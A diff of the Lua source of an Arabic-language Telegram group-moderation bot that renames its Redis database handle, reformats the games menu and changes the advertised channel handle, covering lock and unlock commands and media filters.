+datahmade:del("Fun_Bots:"..bot_id..msg.chat_id_)
 end
 
 if (text and text == 'تفعيل التثبيت') then
-if not database:get('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '✔️┇التثبيت بالفعل تم تفعيله', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل التثبيت', 1, 'md')
-database:del('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_)
 end
 end
 if (text and text == 'تعطيل التثبيت') then
-if database:get('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🔌┇التثبيت بالفعل تم تعطيله', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل التثبيت', 1, 'md')
-database:set('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_,true)
 end
 end
 if text == ("تثبيت") and not is_owner(msg) then
 local id = msg.id_
 local msgs = {[0] = id}
-if not database:get('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_) then
 pin(msg.chat_id_,msg.reply_to_message_id_,0)
-database:set('MohaMeD:'..bot_id..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
+datahmade:set('MohaMeD:'..bot_id..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
 send(msg.chat_id_, msg.id_, 1, '📌┇ تم تثبيت الرسالة  ',1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '❌┇التثبيت معطل',1, 'md')
 end
 end
 if text == ("الغاء تثبيت") and not is_owner(msg) or text == ("الغاء التثبيت") and not is_owner(msg) then
-if not database:get('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_) then
 unpinmsg(msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '❌┇تم الغاء تثبيت الرساله', 1, 'md')
 else
@@ -5020,21 +4881,21 @@ function cb(a,b,c)
 textt = '📮┇ تم منع '
 if b.content_.sticker_ then
 local idsticker = b.content_.sticker_.set_id_
-database:sadd('MohaMeD:'..bot_id.."filtersteckr"..msg.chat_id_,idsticker)
+datahmade:sadd('MohaMeD:'..bot_id.."filtersteckr"..msg.chat_id_,idsticker)
 text = 'الملصق'
 sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
 return false
 end
 if b.content_.ID == "MessagePhoto" then
 local photo = b.content_.photo_.id_
-database:sadd('MohaMeD:'..bot_id.."filterphoto"..msg.chat_id_,photo)
+datahmade:sadd('MohaMeD:'..bot_id.."filterphoto"..msg.chat_id_,photo)
 text = 'الصوره'
 sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
 return false
 end
 if b.content_.animation_.animation_ then
 local idanimation = b.content_.animation_.animation_.persistent_id_
-database:sadd('MohaMeD:'..bot_id.."filteranimation"..msg.chat_id_,idanimation)
+datahmade:sadd('MohaMeD:'..bot_id.."filteranimation"..msg.chat_id_,idanimation)
 text = 'المتحركه'
 sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
 return false
@@ -5047,21 +4908,21 @@ function cb(a,b,c)
 textt = '📮┇ تم الغاء منع '
 if b.content_.sticker_ then
 local idsticker = b.content_.sticker_.set_id_
-database:srem('MohaMeD:'..bot_id.."filtersteckr"..msg.chat_id_,idsticker)
+datahmade:srem('MohaMeD:'..bot_id.."filtersteckr"..msg.chat_id_,idsticker)
 text = 'الملصق'
 sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
 return false
 end
 if b.content_.ID == "MessagePhoto" then
 local photo = b.content_.photo_.id_
-database:srem('MohaMeD:'..bot_id.."filterphoto"..msg.chat_id_,photo)
+datahmade:srem('MohaMeD:'..bot_id.."filterphoto"..msg.chat_id_,photo)
 text = 'الصوره'
 sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
 return false
 end
 if b.content_.animation_.animation_ then
 local idanimation = b.content_.animation_.animation_.persistent_id_
-database:srem('MohaMeD:'..bot_id.."filteranimation"..msg.chat_id_,idanimation)
+datahmade:srem('MohaMeD:'..bot_id.."filteranimation"..msg.chat_id_,idanimation)
 text = 'المتحركه'
 sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
 return false
@@ -5070,15 +4931,15 @@ end
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),cb) 
 end
 if text == 'مسح قائمه منع المتحركات' then 
-database:del('MohaMeD:'..bot_id.."filteranimation"..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id.."filteranimation"..msg.chat_id_)
 sendtext(msg.chat_id_, msg.id_,'🔖┇ تم مسح قائمه منع المتحركات')  
 end
 if text == 'مسح قائمه منع الصور' then 
-database:del('MohaMeD:'..bot_id.."filterphoto"..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id.."filterphoto"..msg.chat_id_)
 sendtext(msg.chat_id_, msg.id_,'🔖┇ تم مسح قائمه منع الصور')  
 end
 if text == 'مسح قائمه منع الملصقات' then 
-database:del('MohaMeD:'..bot_id.."filtersteckr"..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id.."filtersteckr"..msg.chat_id_)
 sendtext(msg.chat_id_, msg.id_,'🔖┇ تم مسح قائمه منع الملصقات')  
 end
 
@@ -5086,654 +4947,655 @@ if text == 'تفعيل اللعبه' then
 send(msg.chat_id_, msg.id_, 1,[[*
 🎮| تم تفعيل الالعاب بنجاح  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📋| الالعاب المتاحه لديك هي ↓
+📬| قائمه الالعاب لديك ↓
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+🌀|↫ ❨سمايلات❩ لترتيب الكلمات
+⛹️‍♂️|↫ ❨الاسرع❩ لاسرع اجابه
+🎰|↫ ❨حزوره❩ لتحزر الجمله
+🧩|↫ ❨معاني❩ لمعنا السمايلات
+✖️|↫ ❨العكس❩ عكس الكلام 
+🎲|↫ ❨بات❩ لعبه البات او محيبس
+🎨|↫ ❨خمن❩ تخمين الكلمه
+💭|↫ ❨امثله❩ لعبه الامثله 
+🧲|↫ ❨المختلف❩ لعبه المختلفات
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🚸| ارسل امر (الاسرع) لبدء لعبه
-🚸| ارسل امر (سمايلات) لبدء لعبه
-🚸| ارسل امر (حزوره) لبدء لعبه
-🚸| ارسل امر (المعاني) لبدء لعبه
-🚸| ارسل امر (العكس) لبدء لعبه
-🚸| ارسل امر (بات) لبدء لعبه
-🚸| ارسل امر (خمن) لبدء لعبه
-🚸| ارسل امر (امثله) لبدء لعبه
-🚸| ارسل امر (المختلف) لبدء لعبه
-┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-Ch  ☰ *[@M1_m2s] 🃏
+Ch  ☰ *[@MohaMeD] 🃏
 ]], 1, 'md')
-database:set('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_,true)  
+datahmade:set('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_,true)  
 end
 if text == 'الالعاب' then   
 send(msg.chat_id_, msg.id_, 1,[[*
 🎮| اهلا بك في الالعاب  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📋| الالعاب المتاحه لديك هي ↓
+📬| قائمه الالعاب لديك ↓
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+🌀|↫ ❨سمايلات❩ لترتيب الكلمات
+⛹️‍♂️|↫ ❨الاسرع❩ لاسرع اجابه
+🎰|↫ ❨حزوره❩ لتحزر الجمله
+🧩|↫ ❨معاني❩ لمعنا السمايلات
+✖️|↫ ❨العكس❩ عكس الكلام 
+🎲|↫ ❨بات❩ لعبه البات او محيبس
+🎨|↫ ❨خمن❩ تخمين الكلمه
+💭|↫ ❨امثله❩ لعبه الامثله 
+🧲|↫ ❨المختلف❩ لعبه المختلفات
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🚸| ارسل امر (الاسرع) لبدء لعبه
-🚸| ارسل امر (سمايلات) لبدء لعبه
-🚸| ارسل امر (حزوره) لبدء لعبه
-🚸| ارسل امر (المعاني) لبدء لعبه
-🚸| ارسل امر (العكس) لبدء لعبه
-🚸| ارسل امر (بات) لبدء لعبه
-🚸| ارسل امر (خمن) لبدء لعبه
-🚸| ارسل امر (امثله) لبدء لعبه
-🚸| ارسل امر (المختلف) لبدء لعبه
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-Ch  ☰ *[@M1_m2s] 🃏
+Ch  ☰ *[@MohaMeD] 🃏
 ]], 1, 'md')
 end
 
 if text == 'تعطيل اللعبه' then  
 taha = '🎮┇ تم تعطيل اللعبه  ' 
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
-database:del('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) 
+datahmade:del('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) 
 end
 
 end -- if is_owner(msg) then
 ------------------------------------------------------------------------
-if is_devabas(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) or is_owner(msg) or is_mod(msg) then
+if is_devahmad(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) or is_owner(msg) or is_mod(msg) then
 if (text == "قفل التاك") then
-local tsX_o = database:get("lock_tag:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_tag:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل التاك ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل التاك ")
-database:set("lock_tag:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_tag:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الرد") then
-local tsX_o = database:get("lock_reple:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_reple:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الرد على الرسائل ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الرد على الرسائل ")
-database:set("lock_reple:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_reple:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الشارحه") then
-local tsX_o = database:get("lock_sarha:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_sarha:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الشارحه ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الشارحه ")
-database:set("lock_sarha:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_sarha:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الكلايش") then
-local tsX_o = database:get("lock_word:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_word:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الكلايش ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الكلايش ")
-database:set("lock_word:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_word:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل التكرار") then
-local tsX_o = database:get("lock_lllll:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_lllll:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل التكرار ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل التكرار ")
-database:set("lock_lllll:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_lllll:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل المتحركه") then
-local tsX_o = database:get("lock_gif:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_gif:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل المتحركه ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل المتحركه ")
-database:set("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الملفات") then
-local tsX_o = database:get("lock_files:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_files:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الملفات ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الملفات ")
-database:set("lock_files:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_files:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الماركدون") then
-local tsX_o = database:get("lock_mark:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_mark:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الماركدون ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الماركدون ")
-database:set("lock_mark:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_mark:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الصور") then
-local tsX_o = database:get("lock_photo:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_photo:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الصور ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الصور ")
-database:set("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الملصقات") then
-local tsX_o = database:get("lock_stecker:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_stecker:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الملصقات ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الملصقات ")
-database:set("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الفيديو") then
-local tsX_o = database:get("lock_video:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_video:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الفيديو ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الفيديو ")
-database:set("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الانلاين") then
-local tsX_o = database:get("lock_inline:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_inline:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الانلاين ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الانلاين ")
-database:set("lock_inline:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_inline:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الدردشه") then
-local tsX_o = database:get("lock_chat:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_chat:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الدردشه ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الدردشه ")
-database:set("lock_chat:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_chat:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل التوجيه") then
-local tsX_o = database:get("lock_fwd:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_fwd:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل التوجيه ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل التوجيه ")
-database:set("lock_fwd:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_fwd:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل التثبيت") then
-local tsX_o = database:get("lock_pin:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_pin:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل التثبيت ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل التثبيت ")
-database:set("lock_pin:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_pin:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الاغاني") then
-local tsX_o = database:get("lock_audeo:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_audeo:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الاغاني ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الاغاني ")
-database:set("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الصوت") then
-local tsX_o = database:get("lock_voice:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_voice:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الصوت ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الصوت ")
-database:set("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الجهات") then
-local tsX_o = database:get("lock_contact:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_contact:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الجهات ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الجهات ")
-database:set("lock_contact:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_contact:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل العربيه") then
-local tsX_o = database:get("lock_ar:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_ar:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل العربيه ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل العربيه ")
-database:set("lock_ar:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_ar:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الانكليزيه") then
-local tsX_o = database:get("lock_en:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_en:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الانكليزيه ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الانكليزيه ")
-database:set("lock_en:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_en:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الميديا") then
-local tsX_o = database:get("lock_media:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_media:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الميديا ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الميديا ")
-database:set("lock_media:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_media:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الروابط") then
-local tsX_o = database:get("lock_link:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_link:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الروابط ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الروابط ")
-database:set("lock_link:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_link:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل المعرف") then
-local tsX_o = database:get("lock_username:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_username:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل المعرف ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل المعرف ")
-database:set("lock_username:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_username:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الاشعارات") then
-local tsX_o = database:get("lock_new:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_new:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الاشعارات ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الاشعارات ")
-database:set("lock_new:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_new:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل البوتات بالطرد") then
-local tsX_o = database:get("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل البوتات بالطرد ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل البوتات بالطرد ")
-database:set("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل البوتات") then
-local tsX_o = database:get("lock_bot:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_bot:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل البوتات ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل البوتات ")
-database:set("lock_bot:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_bot:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الدخول") then
-local tsX_o = database:get("lock_join:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_join:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الدخول للمجموعه ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الدخول للمجموعه ")
-database:set("lock_join:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_join:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل بصمه الفيديو") then
-local tsX_o = database:get("lock_note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل بصمه فيديو ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل بصمه فيديو ")
-database:set("lock_note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل الكل") then
-database:set("lock_tag:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_sarha:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_word:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_edit:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_lllll:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_files:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_mark:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_contact:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_fwd:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_link:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_username:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_new:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_tag:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_sarha:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_word:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_edit:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_lllll:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_files:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_mark:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_contact:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_fwd:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_link:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_username:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_new:MohaMeD"..msg.chat_id_..bot_id,"ok")
 tsX000("lock",msg,"🔐┇ تم قفل جميع الاوامر ")
 end
 --         »»                 End MohaMeD lock                         ««              --
 --         »»               Start MohaMeD unlock                       ««              --
 if (text == "فتح الكل") then
-database:del("lock_tag:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_sarha:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_word:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_lllll:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
